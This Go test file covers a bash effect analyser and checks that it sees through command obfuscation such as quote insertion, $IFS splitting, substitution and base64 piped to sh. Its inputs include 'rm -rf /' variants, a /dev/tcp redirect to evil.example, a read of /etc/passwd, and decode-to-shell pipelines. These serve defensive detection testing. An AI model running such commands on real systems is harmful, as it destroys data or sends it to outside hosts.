package bash_test

import (
	"encoding/json"
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/v0lka/flowsh/bind"
	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/front/bash"
)

// This file exercises the abstract-execution layer (front/bash/exec.go). It is
// an external test package on purpose: the execution layer resolves command
// names and produces effects through the Resolver seam, and the concrete
// resolver is the knowledge-base binder — which imports front/bash, so it can
// only be wired from outside that package.

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

// newResolver wires the real knowledge-base binder into the Resolver seam.
func newResolver(t *testing.T) bash.Resolver {
	t.Helper()
	b, err := bind.NewDefault()
	if err != nil {
		t.Fatalf("bind.NewDefault: %v", err)
	}
	return func(cmd *bash.Command, prog *bash.Program) bash.Resolution {
		r := b.BindBash(cmd, prog)
		return bash.Resolution{Effects: r.Effects, Derivations: r.Derivations}
	}
}

// effectKeys returns the sorted canonical keys of a result's effects.
func effectKeys(res *bash.ExecResult) []string {
	out := make([]string, 0, len(res.Effects))
	for _, e := range res.Effects {
		out = append(out, e.Key())
	}
	sort.Strings(out)
	return out
}

// hasEffect reports whether the result contains an effect of the given kind
// acting exactly on the given target set.
func hasEffect(res *bash.ExecResult, kind engine.EffectKind, targets ...string) bool {
	want := engine.ScopeOf(targets...)
	for _, e := range res.Effects {
		if e.Kind == kind && e.Target.Equal(want) {
			return true
		}
	}
	return false
}

// hasTopKind reports whether the result contains a ⊤ effect of the given kind.
func hasTopKind(res *bash.ExecResult, kind engine.EffectKind) bool {
	for _, e := range res.Effects {
		if e.Kind == kind && e.Target.IsTop() {
			return true
		}
	}
	return false
}

// hasKindContaining reports whether some effect of the given kind acts on a
// target set that includes target.
func hasKindContaining(res *bash.ExecResult, kind engine.EffectKind, target string) bool {
	for _, e := range res.Effects {
		if e.Kind == kind && e.Target.Contains(target) {
			return true
		}
	}
	return false
}

func cmdNames(res *bash.ExecResult) []string {
	out := make([]string, 0, len(res.Cmds))
	for _, c := range res.Cmds {
		out = append(out, c.Name)
	}
	return out
}

// argOf returns the expanded arguments recorded for the i-th recorded command
// whose name matches name (or nil when there is none).
func argsOf(res *bash.ExecResult, name string) [][]string {
	var out [][]string
	for _, c := range res.Cmds {
		if c.Name != name {
			continue
		}
		var args []string
		for _, w := range c.Args {
			args = append(args, w.Value)
		}
		out = append(out, args)
	}
	return out
}

// ---------------------------------------------------------------------------
// AC 1 (class A): quote insertion is not an evasion
//
//	r''m -rf /tmp/x  ≡  rm -rf /tmp/x
// ---------------------------------------------------------------------------

func TestExecClassA_QuoteConcatenation(t *testing.T) {
	r := newResolver(t)
	plain := bash.ExecBash(`rm -rf /tmp/x`, r)
	obf := bash.ExecBash(`r''m -rf /tmp/x`, r)

	if plain.Top || obf.Top {
		t.Fatalf("unexpected ⊤: plain=%v(%s) obf=%v(%s)", plain.Top, plain.Reason, obf.Top, obf.Reason)
	}
	if !hasEffect(plain, engine.KindFSWrite, "/tmp/x") {
		t.Fatalf("plain form did not yield FSWrite{/tmp/x}: %v", effectKeys(plain))
	}
	if got, want := effectKeys(obf), effectKeys(plain); !reflect.DeepEqual(got, want) {
		t.Fatalf("obfuscated effects %v != plain effects %v", got, want)
	}
	// The obfuscated word must resolve to the same program name.
	if names := cmdNames(obf); len(names) != 1 || names[0] != "rm" {
		t.Fatalf("resolved commands = %v, want [rm]", names)
	}
}

// ---------------------------------------------------------------------------
// AC 2 (class B): $IFS-driven token splitting is not an evasion
//
//	rm$IFS-rf$IFS/tmp/x  →  rm -rf /tmp/x   (with the default IFS)
// ---------------------------------------------------------------------------

func TestExecClassB_IFSSplitting(t *testing.T) {
	r := newResolver(t)
	plain := bash.ExecBash(`rm -rf /tmp/x`, r)
	obf := bash.ExecBash(`rm$IFS-rf$IFS/tmp/x`, r)

	if obf.Top {
		t.Fatalf("unexpected ⊤: %s", obf.Reason)
	}
	if got, want := effectKeys(obf), effectKeys(plain); !reflect.DeepEqual(got, want) {
		t.Fatalf("IFS-split effects %v != plain effects %v", got, want)
	}
	if !hasEffect(obf, engine.KindFSWrite, "/tmp/x") {
		t.Fatalf("IFS-split form lost FSWrite{/tmp/x}: %v", effectKeys(obf))
	}
	if names := cmdNames(obf); len(names) != 1 || names[0] != "rm" {
		t.Fatalf("resolved commands = %v, want [rm]", names)
	}
}

// ---------------------------------------------------------------------------
// AC 3 (class C): command substitution is not an evasion
//
//	$(echo rm) -rf /tmp/x      → effect of rm in the aggregate
//	echo "$(rm /tmp/x)"        → effect of rm in the aggregate
// ---------------------------------------------------------------------------

func TestExecClassC_CommandSubstitution(t *testing.T) {
	r := newResolver(t)

	// The command name is synthesised from the folded stdout of a subshell.
	inName := bash.ExecBash(`$(echo rm) -rf /tmp/x`, r)
	if inName.Top {
		t.Fatalf("unexpected ⊤: %s", inName.Reason)
	}
	if !hasEffect(inName, engine.KindFSWrite, "/tmp/x") {
		t.Fatalf("$(echo rm) form did not yield FSWrite{/tmp/x}: %v", effectKeys(inName))
	}

	// The rm runs inside the substitution; its effect must reach the aggregate
	// even though only its (unknown) stdout flows into echo.
	inBody := bash.ExecBash(`echo "$(rm /tmp/x)"`, r)
	if inBody.Top {
		t.Fatalf("unexpected ⊤: %s", inBody.Reason)
	}
	if !hasEffect(inBody, engine.KindFSWrite, "/tmp/x") {
		t.Fatalf("$(rm …) form did not yield FSWrite{/tmp/x}: %v", effectKeys(inBody))
	}
}

// A command substitution whose stdout is statically known threads its value into
// the surrounding word.
func TestExecCommandSubstitutionValueFlow(t *testing.T) {
	r := newResolver(t)
	res := bash.ExecBash(`echo $(echo inner)`, r)
	if res.Top {
		t.Fatalf("unexpected ⊤: %s", res.Reason)
	}
	args := argsOf(res, "echo")
	if len(args) < 2 {
		t.Fatalf("expected the inner and outer echo, got %v", args)
	}
	outer := args[len(args)-1]
	if len(outer) != 1 || outer[0] != "inner" {
		t.Fatalf("outer echo args = %v, want [inner]", outer)
	}
}

// ---------------------------------------------------------------------------
// AC 4 (class D): a code-execution sink is ⊤
//
//	echo <b64> | base64 -d | sh  →  ⊤ / CodeExec
// ---------------------------------------------------------------------------

func TestExecClassD_CodeExecSink(t *testing.T) {
	r := newResolver(t)
	// "aGVsbG8=" is base64 for "hello"; the decoded text is fed to sh.
	res := bash.ExecBash(`echo aGVsbG8= | base64 -d | sh`, r)
	if !res.HasTop() {
		t.Fatalf("pipeline into sh did not yield ⊤: effects=%v", effectKeys(res))
	}
	if !hasTopKind(res, engine.KindCodeExec) {
		t.Fatalf("expected a ⊤ CodeExec effect, got %v", effectKeys(res))
	}
	if !res.Conservative {
		t.Fatalf("Conservative should be true for a ⊤ effect")
	}

	// The sink rule is intrinsic: it fires with no resolver bound at all.
	bare := bash.ExecBash(`echo aGVsbG8= | base64 -d | sh`, nil)
	if !bare.HasTop() || !hasTopKind(bare, engine.KindCodeExec) {
		t.Fatalf("sink rule must be intrinsic; got %v (top=%v)", effectKeys(bare), bare.Top)
	}
}

// Every interpreter in the sink set is recognized, including when it consumes a
// here-string or an argument rather than a pipe.
func TestExecSinkSet(t *testing.T) {
	r := newResolver(t)
	for _, src := range []string{
		`sh -c "rm -rf /"`,
		`bash <<< "rm -rf /"`,
		`python3 -c "import os"`,
		`node -e "1"`,
		`awk 'BEGIN{system("rm -rf /")}'`,
		`perl -e 'system("ls")'`,
	} {
		res := bash.ExecBash(src, r)
		if !hasTopKind(res, engine.KindCodeExec) {
			t.Fatalf("%q: expected ⊤ CodeExec, got %v", src, effectKeys(res))
		}
	}
}

// ---------------------------------------------------------------------------
// AC 5 (class E): a non-terminating loop degrades to ⊤ within the budget
//
//	while true → ⊤  (and it must not hang)
// ---------------------------------------------------------------------------

func TestExecClassE_BoundedLoop(t *testing.T) {
	r := newResolver(t)
	for _, src := range []string{
		`while true; do :; done`,
		`while true; do echo hi; done`,
		`until false; do echo hi; done`,
	} {
		start := time.Now()
		done := make(chan *bash.ExecResult, 1)
		go func() { done <- bash.ExecBash(src, r) }()

		var res *bash.ExecResult
		select {
		case res = <-done:
		case <-time.After(10 * time.Second):
			t.Fatalf("%q did not terminate", src)
		}
		elapsed := time.Since(start)
		if !res.Top {
			t.Fatalf("%q: expected ⊤, got top=%v effects=%v", src, res.Top, effectKeys(res))
		}
		if res.Reason == "" {
			t.Fatalf("%q: ⊤ result must carry a reason", src)
		}
		if elapsed > 5*time.Second {
			t.Fatalf("%q took %s: not bounded", src, elapsed)
		}
	}
}

// ---------------------------------------------------------------------------
// Redirections
// ---------------------------------------------------------------------------

func TestExecRedirections(t *testing.T) {
	r := newResolver(t)

	res := bash.ExecBash(`cmd < in > out`, r)
	if !hasEffect(res, engine.KindFSRead, "in") {
		t.Fatalf("missing FSRead{in}: %v", effectKeys(res))
	}
	if !hasEffect(res, engine.KindFSWrite, "out") {
		t.Fatalf("missing FSWrite{out}: %v", effectKeys(res))
	}

	res = bash.ExecBash(`cmd >> out`, r)
	if !hasEffect(res, engine.KindFSWrite, "out") {
		t.Fatalf("append redirect: missing FSWrite{out}: %v", effectKeys(res))
	}

	res = bash.ExecBash(`cmd <> rw`, r)
	if !hasEffect(res, engine.KindFSRead, "rw") || !hasEffect(res, engine.KindFSWrite, "rw") {
		t.Fatalf("read-write redirect: %v", effectKeys(res))
	}

	// File-descriptor duplication is a stdio effect, not a file effect.
	res = bash.ExecBash(`cmd 2>&1`, r)
	if len(res.Effects) == 0 {
		t.Fatalf("fd duplication produced no effect")
	}

	// A heredoc is an input redirection whose body may expand.
	res = bash.ExecBash("cat <<EOF\n$(rm -rf /tmp/h)\nEOF\n", r)
	if !hasEffect(res, engine.KindFSWrite, "/tmp/h") {
		t.Fatalf("heredoc body substitution lost FSWrite{/tmp/h}: %v", effectKeys(res))
	}
}

func TestExecNetworkRedirection(t *testing.T) {
	r := newResolver(t)
	res := bash.ExecBash(`echo hi > /dev/tcp/evil.example/4444`, r)
	if !hasEffect(res, engine.KindNetEgress, "evil.example:4444") {
		t.Fatalf("missing NetEgress{evil.example:4444}: %v", effectKeys(res))
	}

	res = bash.ExecBash(`cat < /dev/tcp/evil.example/80`, r)
	if !hasEffect(res, engine.KindNetIngress, "evil.example:80") {
		t.Fatalf("missing NetIngress{evil.example:80}: %v", effectKeys(res))
	}
}

// ---------------------------------------------------------------------------
// Pipelines and subshell scope
// ---------------------------------------------------------------------------

func TestExecPipelineEffectsUnion(t *testing.T) {
	r := newResolver(t)
	res := bash.ExecBash(`cat < /etc/passwd | sort > /tmp/g`, r)
	if !hasKindContaining(res, engine.KindFSRead, "/etc/passwd") {
		t.Fatalf("missing FSRead{/etc/passwd}: %v", effectKeys(res))
	}
	if !hasEffect(res, engine.KindFSWrite, "/tmp/g") {
		t.Fatalf("missing FSWrite{/tmp/g}: %v", effectKeys(res))
	}
}

func TestExecSubshellStateIsolation(t *testing.T) {
	r := newResolver(t)
	// The assignment inside the subshell must not escape it.
	res := bash.ExecBash(`x=1; (x=2); echo $x`, r)
	args := argsOf(res, "echo")
	if len(args) == 0 {
		t.Fatalf("no echo command recorded: %v", cmdNames(res))
	}
	last := args[len(args)-1]
	if len(last) != 1 || last[0] != "1" {
		t.Fatalf("subshell leaked its assignment: echo args = %v, want [1]", last)
	}
}

// ---------------------------------------------------------------------------
// ⊤ fallbacks
// ---------------------------------------------------------------------------

func TestExecUnknownBinaryIsTop(t *testing.T) {
	r := newResolver(t)
	res := bash.ExecBash(`frobnicate --wat /y`, r)
	if !res.HasTop() {
		t.Fatalf("unknown binary should be ⊤: %v", effectKeys(res))
	}
}

func TestExecDynamicNameIsTop(t *testing.T) {
	r := newResolver(t)
	res := bash.ExecBash(`$CMD /y`, r)
	if !res.HasTop() {
		t.Fatalf("dynamically-named command should be ⊤: %v", effectKeys(res))
	}
	// A statically-unknown operand widens the target to ⊤ too.
	res = bash.ExecBash(`T=$UNKNOWN; rm -rf "$T"`, r)
	if !hasTopKind(res, engine.KindFSWrite) {
		t.Fatalf("dynamic operand should widen FSWrite to ⊤: %v", effectKeys(res))
	}
}

func TestExecParseFailureIsTop(t *testing.T) {
	res := bash.ExecBash(`if true; then`, nil)
	if !res.Top || res.Reason == "" || len(res.Effects) == 0 {
		t.Fatalf("parse failure should be ⊤ with a reason and a ⊤ effect: %+v", res)
	}
}

// ---------------------------------------------------------------------------
// Functions, aliases, control flow
// ---------------------------------------------------------------------------

func TestExecFunctionsAndAliases(t *testing.T) {
	r := newResolver(t)

	res := bash.ExecBash(`f() { rm -rf /tmp/f; }; f`, r)
	if !hasEffect(res, engine.KindFSWrite, "/tmp/f") {
		t.Fatalf("function body not executed: %v", effectKeys(res))
	}

	res = bash.ExecBash(`alias killall='rm -rf'; killall /tmp/a`, r)
	if !hasEffect(res, engine.KindFSWrite, "/tmp/a") {
		t.Fatalf("alias not expanded: %v", effectKeys(res))
	}
}

func TestExecControlFlowDecidable(t *testing.T) {
	r := newResolver(t)

	res := bash.ExecBash(`if true; then rm -rf /tmp/t; fi`, r)
	if !hasEffect(res, engine.KindFSWrite, "/tmp/t") {
		t.Fatalf("then-branch not taken: %v", effectKeys(res))
	}

	res = bash.ExecBash(`if false; then rm -rf /tmp/t; fi`, r)
	if hasEffect(res, engine.KindFSWrite, "/tmp/t") {
		t.Fatalf("then-branch taken for a false condition: %v", effectKeys(res))
	}
	if res.HasTop() {
		t.Fatalf("decidable branch should not be ⊤: %v", effectKeys(res))
	}

	res = bash.ExecBash(`for i in a b c; do rm -rf /tmp/$i; done`, r)
	if !hasEffect(res, engine.KindFSWrite, "/tmp/a", "/tmp/b", "/tmp/c") {
		t.Fatalf("for-loop did not unroll: %v", effectKeys(res))
	}
}

// ---------------------------------------------------------------------------
// Determinism and robustness
// ---------------------------------------------------------------------------

func TestExecDeterministic(t *testing.T) {
	r := newResolver(t)
	src := `$(echo rm) -rf /tmp/x; echo hi | base64 -d | sh`
	a := bash.ExecBash(src, r)
	b := bash.ExecBash(src, r)
	ja, _ := json.Marshal(a.Effects)
	jb, _ := json.Marshal(b.Effects)
	if string(ja) != string(jb) {
		t.Fatalf("effects not deterministic:\n a=%s\n b=%s", ja, jb)
	}
	if strings.Join(a.Notes, ";") != strings.Join(b.Notes, ";") {
		t.Fatalf("notes not deterministic: %v vs %v", a.Notes, b.Notes)
	}
}

func TestExecNeverPanics(t *testing.T) {
	hostile := []string{
		"",
		"\x00\x01\x02",
		"rm -rf \xff\xfe",
		"$((",
		"{{{",
		strings.Repeat("a", 1<<16),
		strings.Repeat(";", 1000),
		"`unterminated",
		"if if if if",
		"for $ in; do",
		"<<<<<<<<",
		"a" + strings.Repeat("(", 200),
		"echo \x00 rm -rf /",
	}
	r := newResolver(t)
	for _, src := range hostile {
		func(src string) {
			defer func() {
				if rec := recover(); rec != nil {
					t.Fatalf("Exec panicked on %q: %v", src, rec)
				}
			}()
			res := bash.ExecBash(src, r)
			if res == nil {
				t.Fatalf("Exec returned nil for %q", src)
			}
		}(src)
	}
}

// Exec's result must serialise to stable JSON for the same input.
func TestExecResultEncodeStable(t *testing.T) {
	r := newResolver(t)
	res := bash.ExecBash(`FOO=1 rm -rf /tmp/x; cat < in > out`, r)
	a, err := json.Marshal(res)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	res2 := bash.ExecBash(`FOO=1 rm -rf /tmp/x; cat < in > out`, r)
	b, err := json.Marshal(res2)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	if string(a) != string(b) {
		t.Fatalf("ExecResult JSON is not stable")
	}
}

// The intrinsic shell effects are produced even with no resolver bound.
func TestExecNoResolverIntrinsicEffects(t *testing.T) {
	res := bash.ExecBash(`cat < in > out`, nil)
	if !hasEffect(res, engine.KindFSRead, "in") || !hasEffect(res, engine.KindFSWrite, "out") {
		t.Fatalf("redirection effects must be intrinsic: %v", effectKeys(res))
	}
	if res.Top {
		t.Fatalf("a resolvable redirection-only program must not be ⊤")
	}
}

// Environment assignments are recorded as EnvWrite effects.
func TestExecEnvironmentAssignments(t *testing.T) {
	r := newResolver(t)
	res := bash.ExecBash(`FOO=1 BAR=2 rm -rf /tmp/x`, r)
	if !hasEffect(res, engine.KindEnvWrite, "FOO", "BAR") {
		t.Fatalf("missing EnvWrite{FOO,BAR}: %v", effectKeys(res))
	}
	if !hasEffect(res, engine.KindFSWrite, "/tmp/x") {
		t.Fatalf("missing FSWrite{/tmp/x}: %v", effectKeys(res))
	}
	// A bare assignment persists in Σ and is visible to later expansions.
	res = bash.ExecBash(`BAR=rm; "$BAR" -rf /tmp/x`, r)
	if !hasEffect(res, engine.KindFSWrite, "/tmp/x") {
		t.Fatalf("persistent assignment not visible: %v", effectKeys(res))
	}
	found := false
	for _, n := range cmdNames(res) {
		if n == "rm" {
			found = true
		}
	}
	if !found {
		t.Fatalf("resolved commands = %v, want one named rm", cmdNames(res))
	}
}

// The abstract state exposes the pieces of Σ that carry state.
func TestExecFinalState(t *testing.T) {
	r := newResolver(t)
	res := bash.ExecBash(`cd /tmp; umask 077; export EDITOR=vi`, r)
	if res.State == nil {
		t.Fatal("nil final state")
	}
	if res.State.PWD != "/tmp" {
		t.Fatalf("PWD = %q, want /tmp", res.State.PWD)
	}
	if res.State.Umask != "077" {
		t.Fatalf("Umask = %q, want 077", res.State.Umask)
	}
	if v := res.State.Get("EDITOR"); v == nil || v.Value != "vi" || !v.Export {
		t.Fatalf("EDITOR not exported: %+v", v)
	}
}
